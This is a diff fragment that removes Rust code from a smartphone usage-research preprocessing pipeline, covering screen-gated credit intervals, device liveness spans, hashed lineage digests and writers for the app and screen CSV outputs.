-    timestamp_ns: i64,
-    source_data_rows: &SourceDataRows,
-    event_index: usize,
-    next_digest: &str,
-) -> String {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-screen-credit-source-chain/v1");
-    hasher.update(&(event_index as u64).to_le_bytes());
-    hasher.update(&timestamp_ns.to_le_bytes());
-    hasher.update(&(source_data_rows.ranges().len() as u64).to_le_bytes());
-    for source_range in source_data_rows.ranges() {
-        hasher.update(&source_range.first.to_le_bytes());
-        hasher.update(&source_range.last.to_le_bytes());
-    }
-    checkpoint_digest_field(&mut hasher, next_digest.as_bytes());
-    format!("blake3:{}", hasher.finalize().to_hex())
-}
-
-fn build_screen_credit_substrate(raw_events: &[Row]) -> Result<ScreenCreditSubstrate, String> {
-    let mut by_participant: BTreeMap<String, Vec<(i64, String, SourceDataRows)>> = BTreeMap::new();
-    for row in raw_events {
-        by_participant
-            .entry(if row.participant_id.is_empty() {
-                "unknown".into()
-            } else {
-                row.participant_id.to_string()
-            })
-            .or_default()
-            .push((
-                row.event_timestamp_ns,
-                row.interaction_type.to_string(),
-                row.source_data_rows.clone(),
-            ));
-    }
-    let mut substrate = ScreenCreditSubstrate::default();
-    for (participant_id, mut events) in by_participant {
-        events.sort_by_key(|event| event.0);
-        let mut points = Vec::new();
-        let mut last = None;
-        for (timestamp_ns, interaction_type, source_data_rows) in &events {
-            let state = screen_witness_state(interaction_type).map_err(|error| {
-                match source_data_rows.iter().next() {
-                    Some(data_row) => format!("{error} (data row {data_row})"),
-                    None => error,
-                }
-            })?;
-            if let Some(state) = state {
-                if Some(state) != last {
-                    points.push(ScreenChangePoint {
-                        timestamp_ns: *timestamp_ns,
-                        state,
-                        source_data_rows: source_data_rows.clone(),
-                    });
-                    last = Some(state);
-                }
-            }
-        }
-        if events
-            .iter()
-            .any(|(_, kind, _)| kind == "Screen Interactive")
-            && events
-                .iter()
-                .any(|(_, kind, _)| kind == "Screen Non-Interactive")
-        {
-            substrate.capable.insert(participant_id.clone());
-        }
-        substrate.boots.insert(
-            participant_id.clone(),
-            events
-                .iter()
-                .filter(|(_, kind, _)| kind == "Device Startup")
-                .map(|event| event.0)
-                .collect(),
-        );
-        substrate.all_timestamps.insert(
-            participant_id.clone(),
-            events.iter().map(|event| event.0).collect(),
-        );
-        let source_events = events
-            .iter()
-            .map(|event| (event.0, event.2.clone()))
-            .collect::<Vec<_>>();
-        let mut source_event_suffix_digests = vec![String::new(); source_events.len() + 1];
-        source_event_suffix_digests[source_events.len()] =
-            empty_lineage_search_suffix_digest(source_events.len() as u32);
-        for index in (0..source_events.len()).rev() {
-            source_event_suffix_digests[index] = screen_source_event_suffix_digest(
-                source_events[index].0,
-                &source_events[index].1,
-                index,
-                &source_event_suffix_digests[index + 1],
-            );
-        }
-        substrate
-            .source_events
-            .insert(participant_id.clone(), source_events);
-        substrate
-            .source_event_suffix_digests
-            .insert(participant_id.clone(), source_event_suffix_digests);
-        substrate.points.insert(participant_id, points);
-    }
-    Ok(substrate)
-}
-
-fn credit_lineage_contributors(
-    substrate: &ScreenCreditSubstrate,
-    participant_id: &str,
-    start: i64,
-    end: i64,
-    tolerance_ns: i64,
-) -> (SourceDataRows, Option<LineageSearchEvidence>) {
-    let mut contributors = SourceDataRows::default();
-    let search = if let (Some(events), Some(suffix_digests)) = (
-        substrate.source_events.get(participant_id),
-        substrate.source_event_suffix_digests.get(participant_id),
-    ) {
-        let lower_bound = start.saturating_sub(tolerance_ns);
-        let upper_bound = end.saturating_add(tolerance_ns);
-        let lower = events.partition_point(|event| event.0 < lower_bound);
-        let upper = events.partition_point(|event| event.0 <= upper_bound);
-        Some(LineageSearchEvidence {
-            protocol_version: shared_lineage_text("chronicle-lineage-search/v1"),
-            reason: shared_lineage_text("screen-credit-liveness-window"),
-            index_space: shared_lineage_text("participant-source-event-order"),
-            start_participant_id: Arc::new(participant_id.to_owned()),
-            start_event_index: lower as u32,
-            end_event_index_exclusive: upper as u32,
-            candidate_event_count: (upper - lower) as u32,
-            candidate_chain_digest: lineage_search_range_digest(
-                suffix_digests,
-                lower as u32,
-                upper as u32,
-            ),
-        })
-    } else {
-        None
-    };
-    if let Some(points) = substrate.points.get(participant_id) {
-        let first_after_start = points.partition_point(|point| point.timestamp_ns <= start);
-        if let Some(point) = first_after_start
-            .checked_sub(1)
-            .and_then(|index| points.get(index))
-        {
-            contributors.merge(&point.source_data_rows);
-        }
-        let first_after_end = points.partition_point(|point| point.timestamp_ns <= end);
-        for point in &points[first_after_start..first_after_end] {
-            contributors.merge(&point.source_data_rows);
-        }
-    }
-    (contributors, search)
-}
-
-#[cfg(test)]
-fn bisect_left(values: &[i64], target: i64) -> usize {
-    let mut low = 0;
-    let mut high = values.len();
-    while low < high {
-        let middle = (low + high) / 2;
-        if values[middle] < target {
-            low = middle + 1;
-        } else {
-            high = middle;
-        }
-    }
-    low
-}
-
-fn bisect_right(values: &[i64], target: i64) -> usize {
-    let mut low = 0;
-    let mut high = values.len();
-    while low < high {
-        let middle = (low + high) / 2;
-        if values[middle] <= target {
-            low = middle + 1;
-        } else {
-            high = middle;
-        }
-    }
-    low
-}
-
-fn build_alive_spans(timestamps: &[i64], tolerance_ns: i64, boots: &[i64]) -> Vec<CreditInterval> {
-    if timestamps.is_empty() {
-        return Vec::new();
-    }
-    let booted = |left: i64, right: i64| {
-        let index = bisect_right(boots, left);
-        index < boots.len() && boots[index] <= right.saturating_add(10_000_000_000)
-    };
-    let mut spans = Vec::new();
-    let mut span_start = timestamps[0];
-    let mut last = timestamps[0];
-    for timestamp in &timestamps[1..] {
-        if timestamp.saturating_sub(last) <= tolerance_ns && !booted(last, *timestamp) {
-            last = *timestamp;
-        } else {
-            spans.push((span_start, last));
-            span_start = *timestamp;
-            last = *timestamp;
-        }
-    }
-    spans.push((span_start, last));
-    spans
-}
-
-fn clip_alive_spans(spans: &[CreditInterval], start: i64, end: i64) -> Vec<CreditInterval> {
-    let first = spans.partition_point(|span| span.1 <= start);
-    spans[first..]
-        .iter()
-        .take_while(|span| span.0 < end)
-        .filter_map(|(left, right)| {
-            let left = (*left).max(start);
-            let right = (*right).min(end);
-            (right > left).then_some((left, right))
-        })
-        .collect()
-}
-
-#[cfg(test)]
-fn reference_alive_intervals(
-    timestamps: &[i64],
-    start: i64,
-    end: i64,
-    tolerance_ns: i64,
-    boots: &[i64],
-) -> Vec<CreditInterval> {
-    let lower = bisect_left(timestamps, start.saturating_sub(tolerance_ns));
-    let upper = bisect_right(timestamps, end.saturating_add(tolerance_ns));
-    let window = &timestamps[lower..upper];
-    if window.is_empty() {
-        return Vec::new();
-    }
-    let booted = |left: i64, right: i64| {
-        let index = bisect_right(boots, left);
-        index < boots.len() && boots[index] <= right.saturating_add(10_000_000_000)
-    };
-    let mut spans = Vec::new();
-    let mut span_start = window[0];
-    let mut last = window[0];
-    for timestamp in &window[1..] {
-        if timestamp.saturating_sub(last) <= tolerance_ns && !booted(last, *timestamp) {
-            last = *timestamp;
-        } else {
-            spans.push((span_start, last));
-            span_start = *timestamp;
-            last = *timestamp;
-        }
-    }
-    spans.push((span_start, last));
-    spans
-        .into_iter()
-        .filter_map(|(left, right)| {
-            let left = left.max(start);
-            let right = right.min(end);
-            (right > left).then_some((left, right))
-        })
-        .collect()
-}
-
-fn screen_state_at(points: &[ScreenChangePoint], timestamp: i64) -> Option<ScreenCreditState> {
-    points
-        .partition_point(|point| point.timestamp_ns <= timestamp)
-        .checked_sub(1)
-        .map(|index| points[index].state)
-}
-
-fn creditable_intervals(
-    points: &[ScreenChangePoint],
-    start: i64,
-    end: i64,
-    auto_lock_ns: i64,
-) -> Vec<CreditInterval> {
-    let first_point_after_start = points.partition_point(|point| point.timestamp_ns <= start);
-    let mut state = first_point_after_start
-        .checked_sub(1)
-        .map(|index| points[index].state);
-    let mut point_index = first_point_after_start;
-    let mut cursor = start;
-    let mut current: Option<CreditInterval> = None;
-    let mut output = Vec::new();
-    while cursor < end {
-        let segment_end = points
-            .get(point_index)
-            .map(|point| point.timestamp_ns.min(end))
-            .unwrap_or(end);
-        if segment_end > cursor {
-            match state {
-                Some(ScreenCreditState::On) => {
-                    current = Some(match current {
-                        Some((left, _)) => (left, segment_end),
-                        None => (cursor, segment_end),
-                    });
-                }
-                Some(ScreenCreditState::Off)
-                    if current.is_some() && segment_end - cursor < auto_lock_ns =>
-                {
-                    current = current.map(|(left, _)| (left, segment_end));
-                }
-                _ => {
-                    if let Some(interval) = current.take() {
-                        output.push(interval);
-                    }
-                }
-            }
-        }
-        cursor = segment_end;
-        if let Some(point) = points.get(point_index) {
-            state = Some(point.state);
-            point_index += 1;
-        } else {
-            break;
-        }
-    }
-    if let Some(interval) = current {
-        output.push(interval);
-    }
-    output
-}
-
-fn intersect_intervals(left: &[CreditInterval], right: &[CreditInterval]) -> Vec<CreditInterval> {
-    let mut output = Vec::new();
-    let (mut left_index, mut right_index) = (0, 0);
-    while left_index < left.len() && right_index < right.len() {
-        let lower = left[left_index].0.max(right[right_index].0);
-        let upper = left[left_index].1.min(right[right_index].1);
-        if upper > lower {
-            output.push((lower, upper));
-        }
-        if left[left_index].1 < right[right_index].1 {
-            left_index += 1;
-        } else {
-            right_index += 1;
-        }
-    }
-    output
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(tag = "kind", rename_all = "snake_case")]
-enum CreditDecision {
-    Passthrough,
-    Intervals {
-        intervals: Vec<CreditInterval>,
-        session_capped: bool,
-        no_witness_fallback: bool,
-    },
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct CreditEmissionCounts {
-    truncated_sessions: usize,
-    no_witness_fallbacks: usize,
-    fully_dead_sessions: usize,
-}
-
-#[derive(serde::Serialize)]
-#[serde(rename_all = "camelCase")]
-struct CreditPartitionCheckpoint<'a> {
-    session_count: usize,
-    rest_count: usize,
-    session_rows_digest: &'a str,
-    rest_rows_digest: &'a str,
-}
-
-struct ScreenCreditOutput {
-    csv_bytes: Vec<u8>,
-    row_count: u32,
-    row_lineage: Vec<PipelineRowLineage>,
-    effective_usage_checkpoint: WorkflowCheckpoint,
-}
-
-fn is_credit_session(row: &Row) -> bool {
-    row.interaction_type == APP_USAGE && row.duration_minutes.is_some_and(|duration| duration > 0.0)
-}
-
-fn apply_screen_gated_credit_incremental(
-    app_rows: &[Row],
-    raw_events: &[Row],
-    opts: &PipelineV2Options,
-    include_aliases: bool,
-    input_row_parts: Option<&[RowCheckpointParts]>,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<ScreenCreditOutput, String> {
-    let partition = incremental::identify_credit_eligible_sessions(app_rows, input_row_parts)?;
-    query_checkpoints.value(
-        "identify_credit_eligible_sessions",
-        &CreditPartitionCheckpoint {
-            session_count: partition.sessions.len(),
-            rest_count: partition.rest.len(),
-            session_rows_digest: &partition.session_rows_digest,
-            rest_rows_digest: &partition.rest_rows_digest,
-        },
-    )?;
-
-    let substrate = incremental::build_activity_witness_indexes(raw_events)?;
-    query_checkpoints.value("build_activity_witness_indexes", &substrate)?;
-    let screen_incapable = incremental::screen_incapable_participants(&partition, &substrate);
-    query_checkpoints.value("assess_screen_evidence_capability", &screen_incapable)?;
-
-    let day_apps = incremental::summarize_daily_apps(&partition);
-    let day_app_checkpoint = day_apps
-        .iter()
-        .map(|((participant_id, date), packages)| {
-            serde_json::json!({
-                "participantId": participant_id,
-                "date": date,
-                "packages": packages,
-            })
-        })
-        .collect::<Vec<_>>();
-    query_checkpoints.value("summarize_daily_apps", &day_app_checkpoint)?;
-
-    let decisions = incremental::derive_credited_intervals(
-        &partition,
-        &substrate,
-        &day_apps,
-        opts.credited_session_cap_minutes,
-        opts.device_liveness_gap_tolerance_minutes,
-        opts.auto_lock_bridge_seconds,
-        opts.no_witness_min_day_apps,
-    );
-    query_checkpoints.value(
-        "derive_credited_intervals",
-        &serde_json::json!({
-            "decisions": decisions,
-            "toleranceMinutes": opts.device_liveness_gap_tolerance_minutes,
-        }),
-    )?;
-
-    let emission = incremental::materialize_credited_rows(
-        &partition,
-        &decisions,
-        &substrate,
-        opts.device_liveness_gap_tolerance_minutes,
-    );
-    query_checkpoints.value(
-        "materialize_credited_rows",
-        &serde_json::json!({
-            "creditedRowsDigest": emission.credited_rows_digest,
-            "emissionCounts": emission.counts,
-        }),
-    )?;
-    let result = incremental::assemble_credit_outputs(&partition, &screen_incapable, &emission);
-    query_checkpoints.value(
-        "assemble_credit_outputs",
-        &serde_json::json!({
-            "creditedRowsDigest": result.credited_rows_digest,
-            "restRowsDigest": result.rest_rows_digest,
-            "report": result.report,
-        }),
-    )?;
-    let assemble_terminal_digest = query_checkpoints
-        .checkpoints
-        .get("assemble_credit_outputs")
-        .expect("assemble credit checkpoint was just recorded")
-        .terminal_digest
-        .clone();
-    let effective_usage_checkpoint = workflow_checkpoint(
-        "effective_usage",
-        &[],
-        &[(
-            "assemble_credit_outputs",
-            assemble_terminal_digest.as_bytes(),
-        )],
-    );
-    let row_count = u32::try_from(result.rows.len())
-        .map_err(|_| "credited app row count exceeds u32".to_string())?;
-    let csv_bytes =
-        write_app_csv_from_iter(result.rows.iter(), result.rows.len(), opts, include_aliases);
-    let row_lineage =
-        build_row_lineage_from_iter("credited-app-csv", "effective_usage", result.rows.iter());
-    Ok(ScreenCreditOutput {
-        csv_bytes,
-        row_count,
-        row_lineage,
-        effective_usage_checkpoint,
-    })
-}
-
-// ---- screen state machine ----------------------------------------------
-
-#[derive(Clone, serde::Serialize, serde::Deserialize)]
-struct ScreenState {
-    start_index: usize,
-    start_timestamp_ns: i64,
-    start_timezone: SharedString,
-    lock_screen_seen: bool,
-    unlocked_seen: bool,
-    foreground_pkg: Option<SharedString>,
-    last_meaningful_ts_ns: Option<i64>,
-    last_meaningful_pkg: Option<SharedString>,
-    source_data_rows: SourceDataRows,
-}
-
-#[derive(Clone, serde::Serialize, serde::Deserialize)]
-struct ScreenSessionClose {
-    state: ScreenState,
-    stop_timestamp_ns: Option<i64>,
-    stop_event_type: Option<SharedString>,
-}
-
-fn derive_screen_usage_sessions_full(
-    rows: &[Row],
-    opts: &PipelineV2Options,
-    apps_forcing: &HashMap<String, String>,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<Vec<Row>, String> {
-    let keyguard_timestamps = incremental::index_keyguard_events(rows);
-    query_checkpoints.value("index_keyguard_events", &keyguard_timestamps)?;
-    let closes = incremental::infer_screen_session_skeletons(rows);
-    query_checkpoints.value("infer_screen_session_skeletons", &closes)?;
-    let sessions = incremental::classify_screen_sessions(
-        rows,
-        &closes,
-        &keyguard_timestamps,
-        apps_forcing,
-        incremental::ScreenClassificationSettings {
-            auto_lock_timeout_seconds: opts.screen_auto_lock_timeout_seconds,
-            auto_lock_tolerance_seconds: opts.screen_auto_lock_tolerance_seconds,
-            manual_lock_max_tail_seconds: opts.screen_manual_lock_max_tail_seconds,
-            keyguard_near_stop_seconds: opts.screen_keyguard_near_stop_seconds,
-        },
-    );
-    query_checkpoints.rows("classify_screen_sessions", &sessions);
-    Ok(sessions)
-}
-
-// ---- output writer ------------------------------------------------------
-
-pub fn declared_app_output_columns(
-    include_codebook: bool,
-    include_codebook_aliases: bool,
-    usage_layer_active: bool,
-    custom_app_engagement_duration: f64,
-) -> Vec<String> {
-    let mut cols: Vec<String> = Vec::with_capacity(64);
-    cols.push("study_id".into());
-    cols.push("study_name".into());
-    cols.push("participant_id".into());
-    cols.push("possible_device_model".into());
-    cols.push("username".into());
-    cols.push("event_timestamp".into());
-    cols.push("date".into());
-    cols.push("timezone".into());
-    cols.push("app_package_name".into());
-    cols.push("application_label".into());
-    if include_codebook {
-        cols.push("genreId_scraped".into());
-    }
-    if include_codebook && include_codebook_aliases {
-        cols.push("broad_app_category".into());
-    }
-    if include_codebook {
-        for c in codebook_output_columns() {
-            cols.push(c.to_string());
-        }
-    }
-    cols.push("interaction_type".into());
-    cols.push("start_timestamp".into());
-    cols.push("stop_timestamp".into());
-    cols.push("duration_seconds".into());
-    cols.push("duration_minutes".into());
-    cols.push("any_app_usage_flags".into());
-    cols.push("data_time_gap_hours".into());
-    cols.push("day".into());
-    cols.push("weekdayMF".into());
-    cols.push("weekdayMTh".into());
-    cols.push("weekdaySuTh".into());
-    cols.push("hour".into());
-    cols.push("quarter".into());
-    cols.push("valid_app_new_engage_30s".into());
-    cols.push(format!(
-        "valid_app_new_engage_custom_{}s",
-        format_custom_dur(custom_app_engagement_duration)
-    ));
-    cols.push("valid_app_switched_app".into());
-    cols.push("valid_app_usage_time_gap_hours".into());
-    cols.push("any_app_new_engage_30s".into());
-    cols.push(format!(
-        "any_app_new_engage_custom_{}s",
-        format_custom_dur(custom_app_engagement_duration)
-    ));
-    cols.push("any_app_switched_app".into());
-    cols.push("any_app_usage_time_gap_hours".into());
-    cols.push("preprocessor_version".into());
-    cols.push("datetime_of_preprocessing".into());
-    if usage_layer_active {
-        cols.push("usage_layer".into());
-    }
-    cols
-}
-
-fn build_app_columns(opts: &PipelineV2Options, include_codebook_aliases: bool) -> Vec<String> {
-    declared_app_output_columns(
-        opts.use_app_codebook,
-        include_codebook_aliases,
-        opts.model_concurrent_usage || opts.use_background_apps_file,
-        opts.custom_app_engagement_duration,
-    )
-}
-
-fn format_custom_dur(d: f64) -> String {
-    js_number_to_string(d)
-}
-
-pub fn declared_screen_output_columns() -> Vec<String> {
-    vec![
-        "study_id",
-        "study_name",
-        "participant_id",
-        "possible_device_model",
-        "username",
-        "event_timestamp",
-        "date",
-        "timezone",
-        "app_package_name",
-        "application_label",
-        "interaction_type",
-        "start_timestamp",
-        "stop_timestamp",
-        "duration_seconds",
-        "duration_minutes",
-        "screen_usage_end_reason",
-        "screen_usage_end_reason_confidence",
-        "screen_usage_stop_event_type",
-        "screen_usage_last_activity_timestamp",
-        "screen_usage_tail_gap_seconds",
-        "screen_usage_foreground_app_package",
-        "screen_usage_apps_forcing_screen_open_label",
-        "screen_usage_lock_screen_only",
-        "data_time_gap_hours",
-        "day",
-        "weekdayMF",
-        "weekdayMTh",
-        "weekdaySuTh",
-        "hour",
-        "quarter",
-        "preprocessor_version",
-        "datetime_of_preprocessing",
-    ]
-    .into_iter()
-    .map(String::from)
-    .collect()
-}
-
-fn build_screen_columns() -> Vec<String> {
-    declared_screen_output_columns()
-}
-
-fn append_csv_field(out: &mut Vec<u8>, value: &str) {
-    write_csv_field(out, value.as_bytes());
-}
-
-const SMALL_U8_DECIMALS: [&str; 24] = [
-    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16",
-    "17", "18", "19", "20", "21", "22", "23",
-];
-
-fn begin_csv_field(out: &mut Vec<u8>, first: &mut bool) {
-    if !*first {
-        out.push(b',');
-    }
-    *first = false;
-}
-
-fn emit_csv_u8(out: &mut Vec<u8>, value: u8, first: &mut bool) {
-    begin_csv_field(out, first);
-    if let Some(value) = SMALL_U8_DECIMALS.get(value as usize) {
-        out.extend_from_slice(value.as_bytes());
-    } else {
-        append_csv_field(out, &value.to_string());
-    }
-}
-
-fn emit_csv_i32(out: &mut Vec<u8>, value: i32, first: &mut bool) {
-    begin_csv_field(out, first);
-    match value {
-        0 => out.push(b'0'),
-        1 => out.push(b'1'),
-        _ => append_csv_field(out, &value.to_string()),
-    }
-}
-
-fn emit_csv_optional_float(out: &mut Vec<u8>, value: Option<f64>, first: &mut bool) {
-    begin_csv_field(out, first);
-    match value {
-        None => {}
-        Some(0.0) => out.extend_from_slice(b"0.0"),
-        Some(value) => append_csv_field(out, &normalize_float_string(value)),
-    }
-}
-
-fn emit_csv_float(out: &mut Vec<u8>, value: f64, first: &mut bool) {
-    begin_csv_field(out, first);
-    if value == 0.0 {
-        out.extend_from_slice(b"0.0");
-    } else {
-        append_csv_field(out, &normalize_float_string(value));
-    }
-}
-
-fn write_app_csv(rows: &[Row], opts: &PipelineV2Options, include_aliases: bool) -> Vec<u8> {
-    write_app_csv_from_iter(rows.iter(), rows.len(), opts, include_aliases)
-}
-
-fn write_app_csv_from_iter<'a>(
-    rows: impl Iterator<Item = &'a Row>,
-    row_count: usize,
-    opts: &PipelineV2Options,
-    include_aliases: bool,
-) -> Vec<u8> {
-    let cols = build_app_columns(opts, include_aliases);
-    let estimated_row_bytes = if opts.use_app_codebook { 512 } else { 384 };
-    let mut out: Vec<u8> = Vec::with_capacity(row_count.saturating_mul(estimated_row_bytes));
-    // header
-    for (i, c) in cols.iter().enumerate() {
-        if i > 0 {
-            out.push(b',');
-        }
-        append_csv_field(&mut out, c);
-    }
-    out.push(b'\n');
-    let tz: Tz = opts.timezone.parse().unwrap_or(Tz::UTC);
-    let pp_version = PREPROCESSOR_VERSION;
-    let dop = &opts.datetime_of_preprocessing;
-    for row in rows {
-        let row_tz = if row.timezone.as_str() == opts.timezone {
-            tz
-        } else {
-            row.timezone.parse().unwrap_or(tz)
-        };
-        let mut first = true;
-        let emit = |out: &mut Vec<u8>, s: &str, first: &mut bool| {
-            if !*first {
-                out.push(b',');
-            }
-            *first = false;
-            append_csv_field(out, s);
-        };
-        emit(&mut out, &row.study_id, &mut first);
-        emit(&mut out, &opts.study_name, &mut first);
-        emit(&mut out, &row.participant_id, &mut first);
-        emit(&mut out, &row.possible_device_model, &mut first);
-        emit(&mut out, &row.username, &mut first);
-        emit_event_timestamp(&mut out, row.event_timestamp_ns, row_tz, &mut first);
-        emit(&mut out, &row.date, &mut first);
-        emit(&mut out, &row.timezone, &mut first);
-        emit(&mut out, &row.app_package_name, &mut first);
-        emit(&mut out, &row.application_label, &mut first);
-        if opts.use_app_codebook {
-            emit(
-                &mut out,
-                row.genre_id_scraped.as_deref().unwrap_or(""),
-                &mut first,
-            );
-        }
-        if opts.use_app_codebook && include_aliases {
-            emit(
-                &mut out,
-                row.broad_app_category.as_deref().unwrap_or(""),
-                &mut first,
-            );
-        }
-        if opts.use_app_codebook {
-            for (i, _) in CODEBOOK_RENAME_PAIRS.iter().enumerate() {
-                let val = if row.codebook_genre_fields_cleared
-                    && COLLAPSED_GENRE_FIELD_INDICES.contains(&i)
-                {
-                    ""
-                } else {
-                    row.codebook_fields
-                        .get(i)
-                        .and_then(|v| v.as_deref())
-                        .unwrap_or("")
-                };
-                let normalized = if val == "True" {
-                    "true"
-                } else if val == "False" {
-                    "false"
-                } else {
-                    val
-                };
-                emit(&mut out, normalized, &mut first);
-            }
-        }
-        emit(&mut out, &row.interaction_type, &mut first);
-        emit_session_timestamp(&mut out, row.start_timestamp_ns, row_tz, &mut first);
-        emit_session_timestamp(&mut out, row.stop_timestamp_ns, row_tz, &mut first);
-        emit_csv_optional_float(&mut out, row.duration_seconds, &mut first);
-        emit_csv_optional_float(&mut out, row.duration_minutes, &mut first);
-        emit(&mut out, &row.any_app_usage_flags, &mut first);
-        emit_csv_float(&mut out, row.data_time_gap_hours, &mut first);
-        emit_csv_u8(&mut out, row.day, &mut first);
-        emit_csv_u8(&mut out, row.weekday_mf, &mut first);
-        emit_csv_u8(&mut out, row.weekday_mth, &mut first);
-        emit_csv_u8(&mut out, row.weekday_su_th, &mut first);
-        emit_csv_u8(&mut out, row.hour, &mut first);
-        emit_csv_u8(&mut out, row.quarter, &mut first);
-        emit_csv_i32(&mut out, row.valid_app_new_engage_30s, &mut first);
-        emit_csv_i32(&mut out, row.valid_app_new_engage_custom, &mut first);
-        emit_csv_i32(&mut out, row.valid_app_switched_app, &mut first);
-        emit_csv_float(&mut out, row.valid_app_usage_time_gap_hours, &mut first);
-        emit_csv_i32(&mut out, row.any_app_new_engage_30s, &mut first);
-        emit_csv_i32(&mut out, row.any_app_new_engage_custom, &mut first);
-        emit_csv_i32(&mut out, row.any_app_switched_app, &mut first);
-        emit_csv_float(&mut out, row.any_app_usage_time_gap_hours, &mut first);
-        emit(&mut out, pp_version, &mut first);
-        emit(&mut out, dop, &mut first);
-        if opts.model_concurrent_usage || opts.use_background_apps_file {
-            emit(
-                &mut out,
-                row.usage_layer.as_deref().unwrap_or(""),
-                &mut first,
-            );
-        }
-        out.push(b'\n');
-    }
-    out
-}
-
-fn write_screen_csv(rows: &[Row], opts: &PipelineV2Options) -> Vec<u8> {
-    let cols = build_screen_columns();
-    let mut out: Vec<u8> = Vec::with_capacity(rows.len().saturating_mul(384));
-    for (i, c) in cols.iter().enumerate() {
-        if i > 0 {
-            out.push(b',');
-        }
-        append_csv_field(&mut out, c);
-    }
-    out.push(b'\n');
-    if rows.is_empty() {
-        return out;
-    }
-    let tz: Tz = opts.timezone.parse().unwrap_or(Tz::UTC);
-    let pp_version = PREPROCESSOR_VERSION;
-    let dop = &opts.datetime_of_preprocessing;
-    for row in rows {
-        let row_tz = if row.timezone.as_str() == opts.timezone {
-            tz
-        } else {
-            row.timezone.parse().unwrap_or(tz)
-        };
-        let mut first = true;
-        let emit = |out: &mut Vec<u8>, s: &str, first: &mut bool| {
-            if !*first {
-                out.push(b',');
-            }
-            *first = false;
-            append_csv_field(out, s);
-        };
-        emit(&mut out, &row.study_id, &mut first);
-        emit(&mut out, &opts.study_name, &mut first);
-        emit(&mut out, &row.participant_id, &mut first);
-        emit(&mut out, &row.possible_device_model, &mut first);
-        emit(&mut out, &row.username, &mut first);
-        emit_event_timestamp(&mut out, row.event_timestamp_ns, row_tz, &mut first);
-        emit(&mut out, &row.date, &mut first);
-        emit(&mut out, &row.timezone, &mut first);
-        emit(&mut out, &row.app_package_name, &mut first);
-        emit(&mut out, "", &mut first); // application_label always empty
-        emit(&mut out, &row.interaction_type, &mut first);
-        emit_screen_timestamp(&mut out, row.start_timestamp_ns, row_tz, &mut first);
-        emit_screen_timestamp(&mut out, row.stop_timestamp_ns, row_tz, &mut first);
-        emit_csv_optional_float(&mut out, row.duration_seconds, &mut first);
-        emit_csv_optional_float(&mut out, row.duration_minutes, &mut first);
-        emit(
-            &mut out,
-            row.screen_usage_end_reason.as_deref().unwrap_or(""),
-            &mut first,
-        );
-        emit_csv_optional_float(&mut out, row.screen_usage_end_reason_confidence, &mut first);
-        emit(
-            &mut out,
-            row.screen_usage_stop_event_type.as_deref().unwrap_or(""),
-            &mut first,
-        );
-        emit_screen_last_activity(
-            &mut out,
-            row.screen_usage_last_activity_timestamp_ns,
-            row_tz,
-            &mut first,
-        );
-        emit_csv_optional_float(&mut out, row.screen_usage_tail_gap_seconds, &mut first);
-        emit(
-            &mut out,
-            row.screen_usage_foreground_app_package
-                .as_deref()
-                .unwrap_or(""),
-            &mut first,
-        );
-        emit(
-            &mut out,
-            row.screen_usage_apps_forcing_screen_open_label
-                .as_deref()
-                .unwrap_or(""),
-            &mut first,
-        );
-        let lso = match row.screen_usage_lock_screen_only {
-            None => "",
-            Some(0) => "false",
-            Some(_) => "true",
-        };
-        emit(&mut out, lso, &mut first);
-        emit(&mut out, "", &mut first); // data_time_gap_hours always blank in screen
-        emit_csv_u8(&mut out, row.day, &mut first);
-        emit_csv_u8(&mut out, row.weekday_mf, &mut first);
-        emit_csv_u8(&mut out, row.weekday_mth, &mut first);
-        emit_csv_u8(&mut out, row.weekday_su_th, &mut first);
-        emit_csv_u8(&mut out, row.hour, &mut first);
-        emit_csv_u8(&mut out, row.quarter, &mut first);
-        emit(&mut out, pp_version, &mut first);
-        emit(&mut out, dop, &mut first);
-        out.push(b'\n');
-    }
-    out
-}
-
-// ---- main runner --------------------------------------------------------
-
-pub fn run_pipeline_v2(
-    csv_bytes: &[u8],
-    opts: &PipelineV2Options,
-    filter_csv: &[u8],
-    apps_forcing_csv: &[u8],
-    codebook_csv: &[u8],
-) -> Result<PipelineV2Result, String> {
-    run_pipeline_v2_with_supports(
-        csv_bytes,
-        opts,
-        PipelineV2SupportFiles {
-            filter_csv,
-            apps_forcing_csv,
-            codebook_csv,
-            ..PipelineV2SupportFiles::default()
-        },
-    )
-}
-
-pub fn run_pipeline_v2_with_background(
-    csv_bytes: &[u8],
-    opts: &PipelineV2Options,
-    filter_csv: &[u8],
-    apps_forcing_csv: &[u8],
-    background_apps_csv: &[u8],
-    codebook_csv: &[u8],
-) -> Result<PipelineV2Result, String> {
-    run_pipeline_v2_with_supports(
-        csv_bytes,
-        opts,
-        PipelineV2SupportFiles {
-            filter_csv,
-            apps_forcing_csv,
-            background_apps_csv,
-            codebook_csv,
-            ..PipelineV2SupportFiles::default()
-        },
-    )
-}
-
-pub fn run_pipeline_v2_with_supports(
-    csv_bytes: &[u8],
-    opts: &PipelineV2Options,
-    support: PipelineV2SupportFiles<'_>,
-) -> Result<PipelineV2Result, String> {
-    let mut workflow_query_group_digests = BTreeMap::new();
-    let mut workflow_query_group_checkpoints = BTreeMap::new();
-    let mut workflow_query_digests = BTreeMap::new();
-    let mut workflow_query_checkpoints = BTreeMap::new();
-    let mut query_checkpoints = QueryCheckpointRecorder {
-        digests: &mut workflow_query_digests,
-        checkpoints: &mut workflow_query_checkpoints,
-        remaining_queries: crate::workflow_contract::WORKFLOW_QUERIES.iter(),
-        error: None,
-        last_row_parts: None,
-        last_row_checkpoint: None,
-    };
-    // 1. parse + sort + canonicalize
-    let (mut rows, _tz) = parse_raw_rows(csv_bytes, opts, &mut query_checkpoints)?;
-    record_workflow_checkpoint(
-        &mut workflow_query_group_digests,
-        &mut workflow_query_group_checkpoints,
-        workflow_rows_checkpoint_reusing_last("parse_events", &rows, &query_checkpoints),
-    );
-    let original_count = rows.len() as u32;
-    let available_timezones: Vec<String> = rows
-        .iter()
-        .filter_map(|row| {
-            let timezone = row.timezone.trim();
-            (!timezone.is_empty()).then_some(timezone.to_string())
-        })
-        .collect::<BTreeSet<_>>()
-        .into_iter()
-        .collect();
